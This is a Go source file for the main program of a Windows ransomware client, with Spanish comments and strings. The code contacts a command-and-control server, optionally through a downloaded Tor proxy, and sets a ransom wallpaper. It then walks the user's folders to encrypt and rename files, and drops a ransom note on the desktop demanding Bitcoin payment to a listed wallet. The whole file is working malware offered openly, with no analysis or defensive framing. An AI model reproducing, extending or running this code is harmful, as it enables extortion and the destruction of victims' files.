// +build windows
// +build go1.8

package main

import (
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/ElAlecs69/ransomware/client"
	"github.com/ElAlecs69/ransomware/cmd"
	"github.com/ElAlecs69/ransomware/cryptofs"
	"github.com/ElAlecs69/ransomware/tor"
	"github.com/ElAlecs69/ransomware/utils"
)

//go:embed images.jpg
var imageData []byte

const (
	spiSetDeskWallpaper = 0x0014
	spifUpdateIniFile   = 0x01
	spifSendChange      = 0x02
)

var (
	UseTor           string
	SecondsToTimeout = 5.0
	ServerBaseURL    string
	Client           *client.Client

	FilesToRename struct {
		Files []*cryptofs.File
		sync.Mutex
	}
)

func init() {
	cmd.PrintBanner()
	cmd.CheckOS()
}

func main() {
	pubkey, err := Asset("public.pem")
	if err != nil {
		cmd.Logger.Println(err)
		return
	}

	Client = client.New(ServerBaseURL, pubkey)

	if UseTor == "true" {
		cmd.Logger.Println("Tor transport enabled")
		err = Client.UseTorTransport()
		if err != nil {
			cmd.Logger.Println(err)
			return
		}

		cmd.Logger.Println("Downloading the proxy")
		torProxy := tor.New(cmd.TempDir)
		torProxy.DownloadAndExtract()

		cmd.Logger.Println("Waiting tor bootstrap to complete")
		torProxy.Start()
		cmd.Logger.Println("Tor is now live")

		defer func() {
			log.Println("Shutting down Tor and running cleanup")
			torProxy.Kill()
			torProxy.Clean()
		}()
	}

	// 1. Modificar el fondo de pantalla automáticamente
	cmd.Logger.Println("Cambiando fondo de pantalla...")
	changeWallpaper()

	// 2. Desplegar la ventana y el audio (controlado desde el archivo de UI)
	cmd.Logger.Println("Iniciando ventana y audio de rescate...")
	go runAbrazoWindow()

	// 3. Proceder con el cifrado de archivos
	encryptFiles()

	var s string
	fmt.Println("Press enter to quit")
	fmt.Scanf("%s", &s)
}

// ----------------- MÓDULO CAMBIO DE PANTALLA -----------------
func changeWallpaper() {
	tmpFile, err := os.CreateTemp("", "wallpaper_*.jpg")
	if err != nil {
		return
	}
	defer os.Remove(tmpFile.Name())

	if _, err := tmpFile.Write(imageData); err != nil {
		return
	}
	tmpFile.Close()

	pathPtr, err := syscall.UTF16PtrFromString(tmpFile.Name())
	if err != nil {
		return
	}

	user32 := syscall.NewLazyDLL("user32.dll")
	systemParametersInfo := user32.NewProc("SystemParametersInfoW")
	systemParametersInfo.Call(
		uintptr(spiSetDeskWallpaper),
		0,
		uintptr(unsafe.Pointer(pathPtr)),
		uintptr(spifUpdateIniFile|spifSendChange),
	)
}

// ----------------- MÓDULO CIFRADO -----------------
func encryptFiles() {
	keys := make(map[string]string)
	start := time.Now()
	for {
		if duration := time.Since(start); duration.Seconds() >= SecondsToTimeout {
			cmd.Logger.Println("Timeout reached. Aborting...")
			return
		}

		keys["id"], _ = utils.GenerateRandomANString(32)
		keys["enckey"], _ = utils.GenerateRandomANString(32)

		res, err := Client.AddNewKeyPair(keys["id"], keys["enckey"])
		if err != nil {
			cmd.Logger.Println("Ops, something went terribly wrong when contacting the C&C... Aborting...")
			cmd.Logger.Println(err)
			return
		}

		switch res.StatusCode {
		case 200, 204:
			break
		default:
			response := struct {
				Status  int    `json:"status"`
				Message string `json:"message"`
			}{}
			if err = json.NewDecoder(res.Body).Decode(&response); err != nil {
				cmd.Logger.Println(err)
				continue
			}
			cmd.Logger.Printf("%d - %s\n", response.Status, response.Message)
			continue
		}
		break
	}

	cmd.Logger.Println("Walking interesting dirs and indexing files...")

	cmd.Indexer.Add(1)

	go func() {
		defer cmd.Indexer.Done()

		for _, folder := range cmd.InterestingDirs {
			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
				cmd.Logger.Println("Walking " + path)

				if f.IsDir() && utils.SliceContainsSubstring(filepath.Base(path), cmd.SkippedDirs) {
					cmd.Logger.Printf("Skipping dir %s", path)
					return filepath.SkipDir
				}

				ext := strings.ToLower(filepath.Ext(path))

				if !f.IsDir() && f.Size() <= cmd.MaxFileSize && len(ext) >= 2 {
					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
						cmd.Logger.Println("Matched:", path)
						cmd.Indexer.Files <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}
						cmd.Indexer.Add(1)
					}
				}
				return nil
			})
		}
		close(cmd.Indexer.Files)
	}()

	for i := 0; i < cmd.NumWorkers; i++ {
		go func() {
			for {
				select {
				case file, ok := <-cmd.Indexer.Files:
					if !ok {
						return
					}
					defer cmd.Indexer.Done()

					cmd.Logger.Printf("Encrypting %s...\n", file.Path)

					tempFile, err := os.OpenFile(cmd.TempDir+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
					if err != nil {
						cmd.Logger.Println(err)
						return
					}
					defer tempFile.Close()

					err = file.Encrypt(keys["enckey"], tempFile)
					if err != nil {
						cmd.Logger.Println(err)
						continue
					}

					tempFile.Close()

					err = file.ReplaceBy(cmd.TempDir + file.Name())
					if err != nil {
						cmd.Logger.Println(err)
						continue
					}

					FilesToRename.Lock()
					FilesToRename.Files = append(FilesToRename.Files, file)
					FilesToRename.Unlock()
				}
			}
		}()
	}

	cmd.Indexer.Wait()

	var listFilesEncrypted []string

	cmd.Logger.Println("Renaming files...")
	for _, file := range FilesToRename.Files {
		newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)

		cmd.Logger.Printf("Renaming %s to %s\n", file.Path, newpath)
		err := utils.RenameFile(file.Path, newpath+cmd.EncryptionExtension)
		if err != nil {
			cmd.Logger.Println(err)
			continue
		}

		listFilesEncrypted = append(listFilesEncrypted, file.Path)
	}

	message := `
	<pre>
	Has sido encriptado por Alecs y Juano
	usando el algoritmo AES-256.

	Tu identificador unico es:
	%s

	Manda %s a mi wallet
	13i4TFvHBr9Ls24hGvN2BLKVe3Kj3gnzU1

	Despues de que pagues %s
	Manda tu identificador unico para darte%s
	La llave que desencripta tus archivos.
	</pre>
	`
	content := []byte(fmt.Sprintf(message, keys["id"], cmd.Price, cmd.Wallet, cmd.ContactEmail))

	ioutil.WriteFile(cmd.UserDir+"Desktop\\Leeme_para_desencriptar.html", content, 0600)
	ioutil.WriteFile(cmd.UserDir+"Desktop\\Archivos_Encriptados.html", []byte(strings.Join(listFilesEncrypted, "<br>")), 0600)

	cmd.Logger.Println("Ya quedó! No olvides leer Leeme_para_desencriptar.html en tu escritorio.")
}